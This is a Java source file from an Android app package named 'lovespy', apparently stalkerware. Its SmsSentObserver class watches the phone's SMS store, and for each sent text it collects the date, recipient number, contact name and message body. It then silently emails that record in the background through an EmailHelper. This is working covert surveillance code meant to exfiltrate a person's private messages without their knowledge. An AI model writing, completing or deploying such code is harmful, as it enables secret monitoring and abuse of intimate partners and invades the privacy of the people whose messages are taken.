package com.example.lovespy.app.sms;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;

import com.example.lovespy.app.R;
import com.example.lovespy.app.email.EmailHelper;

public class SmsSentObserver extends ContentObserver {

    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static String mPreviousId;

    private Context mContext;
    private SharedPreferences mSharedPref;

    public SmsSentObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
        mSharedPref = ctx.getSharedPreferences(ctx.getString(R.string.preference_file_key), Context.MODE_PRIVATE);
        mPreviousId = readPreviousIdFromSharedPref();
    }

    public String readPreviousIdFromSharedPref() {
        return mSharedPref.getString(mContext.getString(R.string.preference_previous_id), "");
    }

    public void writePreviousIdToSharedPref() {
        SharedPreferences.Editor editor = mSharedPref.edit();
        editor.putString(mContext.getString(R.string.preference_previous_id), mPreviousId);
        editor.commit();
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        String sms = "";
        try{
            Cursor cur = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
            if (cur != null) {
                if (cur.moveToFirst()) {
                    SmsHelper smsHelper = new SmsHelper(mContext);
                    String type = smsHelper.getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")));
                    String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                    if (type.equals(SmsHelper.SENT) && !id.equals(mPreviousId)) {
                        mPreviousId = id;
                        writePreviousIdToSharedPref();
                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                        sms += "Date: "+smsHelper.convertDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
                        sms += "Type: "+type+"\n";
                        if (number != null) {
                            sms += "Number: "+number+"\n";
                        } else {
                            number = smsHelper.getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")));
                            sms += "Number: "+number+"\n";
                        }
                        sms += "Name: "+smsHelper.getContactName(number)+"\n";
                        sms += "Body: "+smsHelper.removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
                        sms += "_______________"+"\n\n";
                    }
                    if (!sms.equals("")) {
                        new AsyncTask<String,Void,Void>() {
                            @Override
                            protected Void doInBackground(String... params) {
                                EmailHelper emailHelper = new EmailHelper(mContext);
                                String letter = params[0];
                                emailHelper.trySending(letter);
                                return null;
                            }
                        }.execute(sms);
                    }
                }
            }
            cur.close();
        }
        catch(Exception sggh){
            sggh.printStackTrace();
        }
        super.onChange(selfChange);
    }
}
